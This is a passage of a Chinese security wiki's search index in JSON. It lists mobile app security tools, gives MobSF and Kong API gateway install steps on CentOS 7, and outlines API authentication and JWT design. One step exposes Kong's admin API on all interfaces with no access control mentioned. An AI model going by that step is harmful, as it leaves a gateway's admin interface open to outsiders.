\u542f\u52a8MobSF python3.6 manage.py runserver 0.0.0.0:8080 \u8e29\u5751\u8bb0 \u5bfc\u51fa\u62a5\u544a\u62a5\u9519 Don't Play Around. An Error just popped in! Attribute not found. 'bool' object has no attribute 'dumps' \u89e3\u51b3\u65b9\u6848 drozer \u5b98\u7f51\u5730\u5740 github\u5730\u5740 Jeb ApkIDE github\u5730\u5740 Android Killer jadx github\u5730\u5740 marvin github\u5730\u5740 Marvin-Django\uff1a\u5305\u542b\u524d\u7aefUI\u754c\u9762\u4e0e\u6570\u636e\u5e93\u90e8\u5206 Marvin static Analyzer\uff1a\u57fa\u4e8eAndroguard\u548cStatic Android Analysis Framework Marvin Dynamic Analyzer\uff1a\u57fa\u4e8eOpenNebula\u548cAndroid-x86\u6a21\u62df\u5668\uff0c\u53ef\u642d\u5efa\u5206\u5e03\u5f0f\u5206\u6790\u7cfb\u7edf\uff0c\u7528\u4e8e\u590d\u73b0\u9759\u6001\u5206\u6790\u53d1\u5e03\u7684\u6f0f\u6d1e\u4e0e\u52a8\u6001\u68c0\u6d4b\u6f0f\u6d1e Marvin toqueton\uff1a\u81ea\u52a8\u5316\u904d\u5386APP UI\u7684\u5de5\u5177\uff0c\u7528\u4e8e\u5206\u6790APP UI\u63a7\u4ef6\u5e76\u8fdb\u884c\u81ea\u52a8\u5316\u4ea4\u4e92\u904d\u5386\uff0c\u8f85\u52a9\u52a8\u6001\u5206\u6790\uff1b IOS needle Needle\u5730\u5740 \u5f00\u6e90\u7684IOS\u5b89\u5168\u6d4b\u8bd5\u6846\u67b6\u3002 \u6d4b\u8bd5\u8303\u56f4\u5305\u62ec\uff1a\u6570\u636e\u5b58\u50a8\u3001\u8fdb\u7a0b\u901a\u4fe1\u3001\u7f51\u7edc\u901a\u4fe1\u3001\u9759\u6001\u4ee3\u7801\u5206\u6790 idb \u5b98\u7f51\u5730\u5740 github\u5730\u5740","title":"\u79fb\u52a8\u5b89\u5168\u5de5\u5177"},{"location":"application-security/mobile-security/mobile-tools/#_1","text":"","title":"\u79fb\u52a8\u5b89\u5168\u5de5\u5177"},{"location":"application-security/mobile-security/mobile-tools/#android","text":"","title":"Android"},{"location":"application-security/mobile-security/mobile-tools/#mobsf","text":"\u79fb\u52a8\u5b89\u5168\u6846\u67b6\uff0c\u652f\u6301\uff1a\u9759\u6001\u5206\u6790APK\u3001IPA\u3001APPX\u6587\u4ef6\uff0c\u52a8\u6001\u5206\u6790APK\u4e0e\u5206\u6790Web API\u3002 github\u5730\u5740 Centos7\u5b89\u88c5MobSF # \u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5python3 yum install https://centos7.iuscommunity.org/ius-release.rpm -y yum install python36u.x86_64 python36u-pip.noarch python36u-devel.x86_64 -y # \u5b89\u88c5MobSF git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git cd Mobile-Security-Framework-MobSF pip3.6 install -r requirements.txt # \u542f\u52a8MobSF python3.6 manage.py runserver 0.0.0.0:8080 \u8e29\u5751\u8bb0 \u5bfc\u51fa\u62a5\u544a\u62a5\u9519 Don't Play Around. An Error just popped in! Attribute not found. 'bool' object has no attribute 'dumps' \u89e3\u51b3\u65b9\u6848","title":"MobSF"},{"location":"application-security/mobile-security/mobile-tools/#drozer","text":"\u5b98\u7f51\u5730\u5740 github\u5730\u5740","title":"drozer"},{"location":"application-security/mobile-security/mobile-tools/#jeb","text":"","title":"Jeb"},{"location":"application-security/mobile-security/mobile-tools/#apkide","text":"github\u5730\u5740","title":"ApkIDE"},{"location":"application-security/mobile-security/mobile-tools/#android-killer","text":"","title":"Android Killer"},{"location":"application-security/mobile-security/mobile-tools/#jadx","text":"github\u5730\u5740","title":"jadx"},{"location":"application-security/mobile-security/mobile-tools/#marvin","text":"github\u5730\u5740 Marvin-Django\uff1a\u5305\u542b\u524d\u7aefUI\u754c\u9762\u4e0e\u6570\u636e\u5e93\u90e8\u5206 Marvin static Analyzer\uff1a\u57fa\u4e8eAndroguard\u548cStatic Android Analysis Framework Marvin Dynamic Analyzer\uff1a\u57fa\u4e8eOpenNebula\u548cAndroid-x86\u6a21\u62df\u5668\uff0c\u53ef\u642d\u5efa\u5206\u5e03\u5f0f\u5206\u6790\u7cfb\u7edf\uff0c\u7528\u4e8e\u590d\u73b0\u9759\u6001\u5206\u6790\u53d1\u5e03\u7684\u6f0f\u6d1e\u4e0e\u52a8\u6001\u68c0\u6d4b\u6f0f\u6d1e Marvin toqueton\uff1a\u81ea\u52a8\u5316\u904d\u5386APP UI\u7684\u5de5\u5177\uff0c\u7528\u4e8e\u5206\u6790APP UI\u63a7\u4ef6\u5e76\u8fdb\u884c\u81ea\u52a8\u5316\u4ea4\u4e92\u904d\u5386\uff0c\u8f85\u52a9\u52a8\u6001\u5206\u6790\uff1b","title":"marvin"},{"location":"application-security/mobile-security/mobile-tools/#ios","text":"","title":"IOS"},{"location":"application-security/mobile-security/mobile-tools/#needle","text":"Needle\u5730\u5740 \u5f00\u6e90\u7684IOS\u5b89\u5168\u6d4b\u8bd5\u6846\u67b6\u3002 \u6d4b\u8bd5\u8303\u56f4\u5305\u62ec\uff1a\u6570\u636e\u5b58\u50a8\u3001\u8fdb\u7a0b\u901a\u4fe1\u3001\u7f51\u7edc\u901a\u4fe1\u3001\u9759\u6001\u4ee3\u7801\u5206\u6790","title":"needle"},{"location":"application-security/mobile-security/mobile-tools/#idb","text":"\u5b98\u7f51\u5730\u5740 github\u5730\u5740","title":"idb"},{"location":"application-security/sdl/api-gateway/","text":"API\u7f51\u5173 \u5f00\u6e90API\u7f51\u5173\uff1aKong \u5b98\u7f51\u5730\u5740 \u5b89\u88c5 \u5b98\u65b9\u5b89\u88c5\u6587\u6863 # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 wget https://bintray.com/kong/kong-community-edition-rpm/download_file?file_path=centos/7/kong-community-edition-0.14.1.el7.noarch.rpm rpm -ivh kong-community-edition-0.14.1.el7.noarch.rpm yum install epel-release -y # \u914d\u7f6e\u6570\u636e\u5e93\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528\u7684\u662fPostgreSQL # \u5207\u6362\u5230postgres\u7528\u6237\u6267\u884c\uff0cpsql\u5c31\u53ef\u4ee5\u8fdb\u884c su - postgres psql create user kong; create database kong owner kong; # kong\u8fc1\u79fb kong migrations up \u62a5\u9519\u5904\u7406\u8bb0\u5f55 \u6700\u597d\u662f\u5728 github issue \u8fdb\u884c\u641c\u7d22 \u62a5\u95191 Error: [postgres error] could not retrieve current migrations: [postgres error] FATAL: Ident authentication failed for user kong \u89e3\u51b3\u65b9\u6848\uff1a vim /var/lib/pgsql/data/pg_hba.conf # \u6211\u662fcentos7 \u6240\u4ee5\u6587\u4ef6\u4f4d\u7f6e\u5728\u8fd9\u91cc\uff0c\u5982\u679c\u4f60\u4e0d\u662f\u53ef\u4ee5\u4f7f\u7528find\u67e5\u627e\u4e00\u4e0b # \u4fee\u6539\u5b8c\u6210\u540e\u91cd\u542f\u670d\u52a1 \u62a5\u95192 Error: [postgres error] could not retrieve current migrations: [postgres error] ERROR: function to_regclass(unknown) does not exist (8) \u89e3\u51b3\u65b9\u6848\uff1a # \u62a5\u8fd9\u4e2a\u9519\u8bef\u610f\u5473\u7740PostgreSQL\u7248\u672c\u4e0d\u9002\u914d\uff0c\u6240\u4ee5\u91cd\u65b0\u5b89\u88c5PostgreSQL\u5427\u3002Kong\u8981\u6c429.5+ # Centos7 PostgreSQL10\u7684yum\u6e90\uff1ahttps://download.postgresql.org/pub/repos/yum/10/redhat/rhel-7-x86_64/pgdg-centos10-10-2.noarch.rpm \u8fc1\u79fb\u5b8c\u6210\u540e\uff0c\u542f\u52a8kong kong start # \u6d4b\u8bd5kong curl -i http://localhost:8001 # kong\u63d0\u4f9b\u5916\u7f51\u8bbf\u95ee cp /etc/kong/kong.conf.default /etc/kong/kong.conf vim /etc/kong/kong.conf # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\uff0c\u5e76\u4fee\u6539\u5982\u4e0b admin_listen = 0.0.0.0:8001, 0.0.0.0:8444 ssl # \u91cd\u542fkong","title":"API\u7f51\u5173"},{"location":"application-security/sdl/api-gateway/#api","text":"","title":"API\u7f51\u5173"},{"location":"application-security/sdl/api-gateway/#apikong","text":"\u5b98\u7f51\u5730\u5740","title":"\u5f00\u6e90API\u7f51\u5173\uff1aKong"},{"location":"application-security/sdl/api-gateway/#_1","text":"\u5b98\u65b9\u5b89\u88c5\u6587\u6863 # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 wget https://bintray.com/kong/kong-community-edition-rpm/download_file?file_path=centos/7/kong-community-edition-0.14.1.el7.noarch.rpm rpm -ivh kong-community-edition-0.14.1.el7.noarch.rpm yum install epel-release -y # \u914d\u7f6e\u6570\u636e\u5e93\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528\u7684\u662fPostgreSQL # \u5207\u6362\u5230postgres\u7528\u6237\u6267\u884c\uff0cpsql\u5c31\u53ef\u4ee5\u8fdb\u884c su - postgres psql create user kong; create database kong owner kong; # kong\u8fc1\u79fb kong migrations up \u62a5\u9519\u5904\u7406\u8bb0\u5f55 \u6700\u597d\u662f\u5728 github issue \u8fdb\u884c\u641c\u7d22 \u62a5\u95191 Error: [postgres error] could not retrieve current migrations: [postgres error] FATAL: Ident authentication failed for user kong \u89e3\u51b3\u65b9\u6848\uff1a vim /var/lib/pgsql/data/pg_hba.conf # \u6211\u662fcentos7 \u6240\u4ee5\u6587\u4ef6\u4f4d\u7f6e\u5728\u8fd9\u91cc\uff0c\u5982\u679c\u4f60\u4e0d\u662f\u53ef\u4ee5\u4f7f\u7528find\u67e5\u627e\u4e00\u4e0b # \u4fee\u6539\u5b8c\u6210\u540e\u91cd\u542f\u670d\u52a1 \u62a5\u95192 Error: [postgres error] could not retrieve current migrations: [postgres error] ERROR: function to_regclass(unknown) does not exist (8) \u89e3\u51b3\u65b9\u6848\uff1a # \u62a5\u8fd9\u4e2a\u9519\u8bef\u610f\u5473\u7740PostgreSQL\u7248\u672c\u4e0d\u9002\u914d\uff0c\u6240\u4ee5\u91cd\u65b0\u5b89\u88c5PostgreSQL\u5427\u3002Kong\u8981\u6c429.5+ # Centos7 PostgreSQL10\u7684yum\u6e90\uff1ahttps://download.postgresql.org/pub/repos/yum/10/redhat/rhel-7-x86_64/pgdg-centos10-10-2.noarch.rpm \u8fc1\u79fb\u5b8c\u6210\u540e\uff0c\u542f\u52a8kong kong start # \u6d4b\u8bd5kong curl -i http://localhost:8001 # kong\u63d0\u4f9b\u5916\u7f51\u8bbf\u95ee cp /etc/kong/kong.conf.default /etc/kong/kong.conf vim /etc/kong/kong.conf # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\uff0c\u5e76\u4fee\u6539\u5982\u4e0b admin_listen = 0.0.0.0:8001, 0.0.0.0:8444 ssl # \u91cd\u542fkong","title":"\u5b89\u88c5"},{"location":"application-security/sdl/api-security-design/","text":"API\u7f51\u5173\u8bbe\u8ba1 \u975e\u539f\u521b API\u6240\u9700\u5b89\u5168\u529f\u80fd \u8eab\u4efd\u548c\u8bbf\u95ee\u63a7\u5236 \u8ba4\u8bc1 HTTP Basic\uff1a API Key\uff1a\u5ba2\u6237\u7aef\u4f20\u9012\uff08\u53c2\u6570+Key+Sign\uff09\u5230\u670d\u52a1\u7aef\uff08\u4f7f\u7528\u53c2\u6570\u8ba1\u7b97Sign\uff0c\u6bd4\u8f83\u4e24\u4e2aSign\uff09 OAuth\uff1a\u6700\u53d7\u6b22\u8fce\u7684\u7f51\u5173\u9a8c\u8bc1\u534f\u8bae JWT\uff1a \u6388\u6743 RBAC\uff1a\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236 ABAC\uff1a\u57fa\u4e8e\u5c5e\u6027\u7684\u8bbf\u95ee\u63a7\u5236 \u901a\u4fe1\u5b89\u5168 \u5a01\u80c1\u9632\u62a4 \u8f93\u5165\u63a7\u5236 \u6d88\u606f\u9650\u5236 SQL\u6ce8\u5165 JSON\u9632\u62a4 XML\u9632\u62a4 \u8f93\u51fa\u63a7\u5236 \u8f93\u51fa\u7f16\u7801 \u65e5\u5fd7\u8bb0\u5f55 \u8ba4\u8bc1\u65e5\u5fd7\uff1a \u64cd\u4f5c\u65e5\u5fd7\uff1a \u9ed1\u767d\u540d\u5355 API\u76d1\u63a7 API\u9650\u901f API\u63a5\u53e3\u8c03\u7528\u65b9\u5f0f HTTP+\u8bf7\u6c42\u7b7e\u540d\u673a\u5236 \u7279\u70b9 \u6240\u6709\u643a\u5e26\u63a5\u53e3\u4fe1\u606f\u7684HTTP\u5934\u5185\u5bb9\u90fd\u5fc5\u987b\u53c2\u4e0e\u7b7e\u540d\u8ba1\u7b97 \u4e0d\u540cHTTP\u5934\u5185\u5bb9\u4e5f\u9700\u8981\u6309\u7167\u4e00\u5b9a\u89c4\u5219\u6392\u5e8f \u4f18\u70b9 \u7f3a\u70b9 \u7b7e\u540d\u7b97\u6cd5\u592a\u590d\u6742\uff0c\u6613\u7528\u6027\u8d3c\u5dee \u54cd\u5e94\u5305\u53ef\u88ab\u7a83\u542c\u3001\u4f2a\u9020\u3001\u9700\u8981\u9632\u8303Replay\uff08\u91cd\u653e\uff09\u653b\u51fb HTTP+\u53c2\u6570\u7b7e\u540d\u673a\u5236 \u7279\u70b9 \u53ea\u6709GET\u548cPOST\u53c2\u6570\u7684\u5185\u5bb9\u9700\u8981\u53c2\u4e0e\u7b7e\u540d\u8ba1\u7b97 \u4f18\u70b9 \u7b7e\u540d\u7b97\u6cd5\u60f3\u5bf9\u7b80\u5355\uff0c\u6613\u7528\u6027\u6709\u8f83\u5927\u63d0\u5347 \u7f3a\u70b9 \u54cd\u5e94\u5305\u53ef\u88ab\u7a83\u542c\u3001\u4f2a\u9020\u3001\u9700\u8981\u9632\u8303Replay\uff08\u91cd\u653e\uff09\u653b\u51fb HTTPS+\u8bbf\u95ee\u4ee4\u724c\u673a\u5236 \u7279\u70b9 \u65e0\u9700\u7b7e\u540d\u8ba1\u7b97 \u4f9d\u9760\u4f20\u8f93\u5c42\u52a0\u5bc6\u548c\u8bbf\u95ee\u4ee4\u724c\u7684\u4e0d\u53ef\u4f2a\u9020\u6027\u4fdd\u8bc1\u5b89\u5168 \u4f18\u70b9 \u76f8\u5bf9\u5b89\u5168\uff0c\u65e0\u6cd5\u901a\u8fc7\u7f51\u7edc\u6293\u5305\u65b9\u5f0f\u7a83\u542c\u6216\u4f2a\u9020\u6570\u636e \u6613\u7528\u6027\u9ad8\uff0c\u65e0\u9700\u518d\u4e3a\u7b7e\u540d\u5934\u75bc\uff0c\u65e0\u9700\u8003\u8651Replay\u653b\u51fb \u7f3a\u70b9 \u5b89\u5168\u6027\u5efa\u7acb\u5728\u7528\u6237\u4e0d\u88ab\u4e2d\u95f4\u4eba\u653b\u51fb\u548c\u4ee4\u724c\u4e0d\u88ab\u6cc4\u6f0f\u7684\u60c5\u51b5\u4e0b \u66f4\u597d\u7684\u65b9\u6848 \u727a\u7272\u6613\u7528\u6027\u6362\u53d6\u5b89\u5168\u6027 HTTPS+\u5185\u5bb9\u7b7e\u540d\u673a\u5236 HTTPS+\u5185\u5bb9\u52a0\u5bc6\u673a\u5236 \u964d\u4f4e\u4ee4\u724c\u6cc4\u6f0f\u5e26\u6765\u7684\u98ce\u9669 \u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b\u7ed1\u5b9a\u670d\u52a1\u5668IP\u5217\u8868\u3001\u9650\u5236refer\u7b49\u652f\u6301 \u9488\u5bf9\u4e0d\u540c\u5e94\u7528\u573a\u666f\u9881\u53d1\u4e0d\u540c\u6709\u6548\u671f\u7b49\u8bbf\u95ee\u4ee4\u724c \u9488\u5bf9\u4e0d\u540c\u5b89\u5168\u7ea7\u522b\u7684\u6570\u636e\u6388\u6743\u9881\u53d1\u4e0d\u540c\u6709\u6548\u671f\u7684\u8bbf\u95ee\u4ee4\u724c \u4e3a\u5f00\u53d1\u8005\u548c\u7528\u6237\u63d0\u4f9b\u4ee4\u724c\u4f5c\u5e9f\u652f\u6301 \u5173\u4e8e\u8ba4\u8bc1 JWT JWT\uff1aJson Web Token \u8de8\u57df\u8ba4\u8bc1\u89e3\u51b3\u65b9\u6848 JWT\u6570\u636e\u683c\u5f0f \u4ee5\u4e00\u4e2a\u5f88\u957f\u7684\u5b57\u7b26\u4e32\u4ee3\u8868\uff0c\u4e2d\u95f4\u7528.\u5206\u5272\u6210\u4e09\u4e2a\u90e8\u5206 Header.Payload.Signature Header\uff1a\u5934\u90e8 alg\uff1a\u7b7e\u540d\u7b97\u6cd5\uff08algorithm\uff09\uff0c\u9ed8\u8ba4\u662fHMAC SHA256\uff1b typ\uff1a\u8868\u793a\u4ee4\u724c\uff08token\uff09\u7684\u7c7b\u578b\uff0cJWT\u4ee4\u724c\u7edf\u4e00\u4e3aJWT\uff1b Payload\uff1a\u8d1f\u8f7d\uff08\u9ed8\u8ba4\u5b57\u6bb5\u6709\u4ee5\u4e0b7\u4e2a\uff0c\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5b57\u6bb5\uff09 iss\uff08issuer\uff09\uff1a\u7b7e\u53d1\u4eba exp\uff08expiration\uff09\uff1a\u8fc7\u671f\u65f6\u95f4 sub\uff08subject\uff09\uff1a\u4e3b\u9898 aud\uff08audience\uff09\uff1a\u53d7\u4f17 nbf\uff08Not Before\uff09\uff1a\u751f\u6548\u65f6\u95f4 iat\uff08Issued At\uff09\uff1a\u7b7e\u53d1\u65f6\u95f4 jti\uff08JWT ID\uff09\uff1a\u7f16\u53f7 Signature\uff1a\u7b7e\u540d\uff08\u6307\u5b9a\u4e00\u4e2a\u5bc6\u94a5\uff09 sign=HMACSHA256\uff08base64UrlEncode(header)+ . +baseUrlEncode(payload),secret\uff09 \u5173\u4e8eBase64URL =\uff1a\u88ab\u7701\u7565 +\uff1a\u66ff\u6362\u4e3a- /\uff1a\u66ff\u6362\u4e3a_ JWT\u7279\u70b9 \u9ed8\u8ba4\u4e0d\u52a0\u5bc6\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u52a0\u5bc6\uff1b JWT\u4e0d\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u5c06\u654f\u611f\u6570\u636e\u5199\u5165JWT\uff1b JWT\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u8ba4\u8bc1\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u4ea4\u6362\u4fe1\u606f\uff1b JWT\u7684\u7f3a\u70b9\uff1a\u7531\u4e8e\u670d\u52a1\u5668\u4e0d\u4fdd\u5b58session\u72b6\u6001\uff0c\u56e0\u6b64\u65e0\u6cd5\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5e9f\u6b62\u67d0\u4e2atoken\uff0c\u6216\u8005\u66f4\u6539token\u7684\u6743\u9650\u3002\u4e5f\u5c31\u662f\u8bf4JWT\u4e00\u65e6\u7b7e\u53d1\uff0c\u5230\u8fc7\u671f\u4e4b\u524d\u90fd\u6709\u6548\uff1b JWT\u672c\u8eab\u5305\u542b\u4e86\u8ba4\u8bc1\u4fe1\u606f\uff0c\u4e00\u65e6\u6cc4\u6f0f\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u83b7\u5f97\u8be5\u4ee4\u724c\u7684\u6240\u6709\u6743\u9650\u3002\u5e94\u8be5\u5c06\u6709\u6548\u671f\u8bbe\u7f6e\u7684\u77ed\u4e00\u4e9b\uff1b \u4e3a\u4e86\u51cf\u5c11\u76d7\u7528JWT\uff0c\u5e94\u8be5\u5c3d\u53ef\u80fd\u4f7f\u7528HTTPS\u534f\u8bae\u4f20\u8f93\uff1b OAuth \u53c2\u8003\u8d44\u6599 \u7f51\u5173\u5728API\u5b89\u5168\u4e2d\u7684\u4f5c\u7528 REST API \u5b89\u5168\u8bbe\u8ba1\u6307\u5357 HTTP API\u63a5\u53e3\u5b89\u5168\u8bbe\u8ba1 \u5f00\u53d1\u5b89\u5168\u7684 API \u6240\u9700\u8981\u6838\u5bf9\u7684\u6e05\u5355 \u79fb\u52a8APP\u7f51\u5173\u5b89\u5168\u8bbe\u8ba1 JSON Web Token \u5165\u95e8\u6559\u7a0b \u7406\u89e3OAuth2.0","title":"API\u7f51\u5173\u8bbe\u8ba1"},{"location":"application-security/sdl/api-security-design/#api","text":"\u975e\u539f\u521b","title":"API\u7f51\u5173\u8bbe\u8ba1"},{"location":"application-security/sdl/api-security-design/#api_1","text":"","title":"API\u6240\u9700\u5b89\u5168\u529f\u80fd"},{"location":"application-security/sdl/api-security-design/#_1","text":"\u8ba4\u8bc1 HTTP Basic\uff1a API Key\uff1a\u5ba2\u6237\u7aef\u4f20\u9012\uff08\u53c2\u6570+Key+Sign\uff09\u5230\u670d\u52a1\u7aef\uff08\u4f7f\u7528\u53c2\u6570\u8ba1\u7b97Sign\uff0c\u6bd4\u8f83\u4e24\u4e2aSign\uff09 OAuth\uff1a\u6700\u53d7\u6b22\u8fce\u7684\u7f51\u5173\u9a8c\u8bc1\u534f\u8bae JWT\uff1a \u6388\u6743 RBAC\uff1a\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236 ABAC\uff1a\u57fa\u4e8e\u5c5e\u6027\u7684\u8bbf\u95ee\u63a7\u5236","title":"\u8eab\u4efd\u548c\u8bbf\u95ee\u63a7\u5236"},{"location":"application-security/sdl/api-security-design/#_2","text":"","title":"\u901a\u4fe1\u5b89\u5168"},{"location":"application-security/sdl/api-security-design/#_3","text":"\u8f93\u5165\u63a7\u5236 \u6d88\u606f\u9650\u5236 SQL\u6ce8\u5165 JSON\u9632\u62a4 XML\u9632\u62a4 \u8f93\u51fa\u63a7\u5236 \u8f93\u51fa\u7f16\u7801","title":"\u5a01\u80c1\u9632\u62a4"},{"location":"application-security/sdl/api-security-design/#_4","text":"\u8ba4\u8bc1\u65e5\u5fd7\uff1a \u64cd\u4f5c\u65e5\u5fd7\uff1a","title":"\u65e5\u5fd7\u8bb0\u5f55"},{"location":"application-security/sdl/api-security-design/#_5","text":"","title":"\u9ed1\u767d\u540d\u5355"},{"location":"application-security/sdl/api-security-design/#api_2","text":"","title":"API\u76d1\u63a7"},{"location":"application-security/sdl/api-security-design/#api_3","text":"","title":"API\u9650\u901f"},{"location":"application-security/sdl/api-security-design/#api_4","text":"","title":"API\u63a5\u53e3\u8c03\u7528\u65b9\u5f0f"},{"location":"application-security/sdl/api-security-design/#http","text":"\u7279\u70b9 \u6240\u6709\u643a\u5e26\u63a5\u53e3\u4fe1\u606f\u7684HTTP\u5934\u5185\u5bb9\u90fd\u5fc5\u987b\u53c2\u4e0e\u7b7e\u540d\u8ba1\u7b97 \u4e0d\u540cHTTP\u5934\u5185\u5bb9\u4e5f\u9700\u8981\u6309\u7167\u4e00\u5b9a\u89c4\u5219\u6392\u5e8f \u4f18\u70b9 \u7f3a\u70b9 \u7b7e\u540d\u7b97\u6cd5\u592a\u590d\u6742\uff0c\u6613\u7528\u6027\u8d3c\u5dee \u54cd\u5e94\u5305\u53ef\u88ab\u7a83\u542c\u3001\u4f2a\u9020\u3001\u9700\u8981\u9632\u8303Replay\uff08\u91cd\u653e\uff09\u653b\u51fb","title":"HTTP+\u8bf7\u6c42\u7b7e\u540d\u673a\u5236"},{"location":"application-security/sdl/api-security-design/#http_1","text":"\u7279\u70b9 \u53ea\u6709GET\u548cPOST\u53c2\u6570\u7684\u5185\u5bb9\u9700\u8981\u53c2\u4e0e\u7b7e\u540d\u8ba1\u7b97 \u4f18\u70b9 \u7b7e\u540d\u7b97\u6cd5\u60f3\u5bf9\u7b80\u5355\uff0c\u6613\u7528\u6027\u6709\u8f83\u5927\u63d0\u5347 \u7f3a\u70b9 \u54cd\u5e94\u5305\u53ef\u88ab\u7a83\u542c\u3001\u4f2a\u9020\u3001\u9700\u8981\u9632\u8303Replay\uff08\u91cd\u653e\uff09\u653b\u51fb","title":"HTTP+\u53c2\u6570\u7b7e\u540d\u673a\u5236"},{"location":"application-security/sdl/api-security-design/#https","text":"\u7279\u70b9 \u65e0\u9700\u7b7e\u540d\u8ba1\u7b97 \u4f9d\u9760\u4f20\u8f93\u5c42\u52a0\u5bc6\u548c\u8bbf\u95ee\u4ee4\u724c\u7684\u4e0d\u53ef\u4f2a\u9020\u6027\u4fdd\u8bc1\u5b89\u5168 \u4f18\u70b9 \u76f8\u5bf9\u5b89\u5168\uff0c\u65e0\u6cd5\u901a\u8fc7\u7f51\u7edc\u6293\u5305\u65b9\u5f0f\u7a83\u542c\u6216\u4f2a\u9020\u6570\u636e \u6613\u7528\u6027\u9ad8\uff0c\u65e0\u9700\u518d\u4e3a\u7b7e\u540d\u5934\u75bc\uff0c\u65e0\u9700\u8003\u8651Replay\u653b\u51fb \u7f3a\u70b9 \u5b89\u5168\u6027\u5efa\u7acb\u5728\u7528\u6237\u4e0d\u88ab\u4e2d\u95f4\u4eba\u653b\u51fb\u548c\u4ee4\u724c\u4e0d\u88ab\u6cc4\u6f0f\u7684\u60c5\u51b5\u4e0b","title":"HTTPS+\u8bbf\u95ee\u4ee4\u724c\u673a\u5236"},{"location":"application-security/sdl/api-security-design/#_6","text":"\u727a\u7272\u6613\u7528\u6027\u6362\u53d6\u5b89\u5168\u6027 HTTPS+\u5185\u5bb9\u7b7e\u540d\u673a\u5236 HTTPS+\u5185\u5bb9\u52a0\u5bc6\u673a\u5236 \u964d\u4f4e\u4ee4\u724c\u6cc4\u6f0f\u5e26\u6765\u7684\u98ce\u9669 \u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b\u7ed1\u5b9a\u670d\u52a1\u5668IP\u5217\u8868\u3001\u9650\u5236refer\u7b49\u652f\u6301 \u9488\u5bf9\u4e0d\u540c\u5e94\u7528\u573a\u666f\u9881\u53d1\u4e0d\u540c\u6709\u6548\u671f\u7b49\u8bbf\u95ee\u4ee4\u724c \u9488\u5bf9\u4e0d\u540c\u5b89\u5168\u7ea7\u522b\u7684\u6570\u636e\u6388\u6743\u9881\u53d1\u4e0d\u540c\u6709\u6548\u671f\u7684\u8bbf\u95ee\u4ee4\u724c \u4e3a\u5f00\u53d1\u8005\u548c\u7528\u6237\u63d0\u4f9b\u4ee4\u724c\u4f5c\u5e9f\u652f\u6301","title":"\u66f4\u597d\u7684\u65b9\u6848"},{"location":"application-security/sdl/api-security-design/#_7","text":"","title":"\u5173\u4e8e\u8ba4\u8bc1"},{"location":"application-security/sdl/api-security-design/#jwt","text":"JWT\uff1aJson Web Token \u8de8\u57df\u8ba4\u8bc1\u89e3\u51b3\u65b9\u6848 JWT\u6570\u636e\u683c\u5f0f \u4ee5\u4e00\u4e2a\u5f88\u957f\u7684\u5b57\u7b26\u4e32\u4ee3\u8868\uff0c\u4e2d\u95f4\u7528.\u5206\u5272\u6210\u4e09\u4e2a\u90e8\u5206 Header.Payload.Signature Header\uff1a\u5934\u90e8 alg\uff1a\u7b7e\u540d\u7b97\u6cd5\uff08algorithm\uff09\uff0c\u9ed8\u8ba4\u662fHMAC SHA256\uff1b typ\uff1a\u8868\u793a\u4ee4\u724c\uff08token\uff09\u7684\u7c7b\u578b\uff0cJWT\u4ee4\u724c\u7edf\u4e00\u4e3aJWT\uff1b Payload\uff1a\u8d1f\u8f7d\uff08\u9ed8\u8ba4\u5b57\u6bb5\u6709\u4ee5\u4e0b7\u4e2a\uff0c\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5b57\u6bb5\uff09 iss\uff08issuer\uff09\uff1a\u7b7e\u53d1\u4eba exp\uff08expiration\uff09\uff1a\u8fc7\u671f\u65f6\u95f4 sub\uff08subject\uff09\uff1a\u4e3b\u9898 aud\uff08audience\uff09\uff1a\u53d7\u4f17 nbf\uff08Not Before\uff09\uff1a\u751f\u6548\u65f6\u95f4 iat\uff08Issued At\uff09\uff1a\u7b7e\u53d1\u65f6\u95f4 jti\uff08JWT ID\uff09\uff1a\u7f16\u53f7 Signature\uff1a\u7b7e\u540d\uff08\u6307\u5b9a\u4e00\u4e2a\u5bc6\u94a5\uff09 sign=HMACSHA256\uff08base64UrlEncode(header)+ . +baseUrlEncode(payload),secret\uff09 \u5173\u4e8eBase64URL =\uff1a\u88ab\u7701\u7565 +\uff1a\u66ff\u6362\u4e3a- /\uff1a\u66ff\u6362\u4e3a_ JWT\u7279\u70b9 \u9ed8\u8ba4\u4e0d\u52a0\u5bc6\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u52a0\u5bc6\uff1b JWT\u4e0d\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0d\u80fd\u5c06\u654f\u611f\u6570\u636e\u5199\u5165JWT\uff1b JWT\u4e0d\u4ec5\u53ef\u4ee5\u7528\u4e8e\u8ba4\u8bc1\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u4ea4\u6362\u4fe1\u606f\uff1b JWT\u7684\u7f3a\u70b9\uff1a\u7531\u4e8e\u670d\u52a1\u5668\u4e0d\u4fdd\u5b58session\u72b6\u6001\uff0c\u56e0\u6b64\u65e0\u6cd5\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5e9f\u6b62\u67d0\u4e2atoken\uff0c\u6216\u8005\u66f4\u6539token\u7684\u6743\u9650\u3002\u4e5f\u5c31\u662f\u8bf4JWT\u4e00\u65e6\u7b7e\u53d1\uff0c\u5230\u8fc7\u671f\u4e4b\u524d\u90fd\u6709\u6548\uff1b 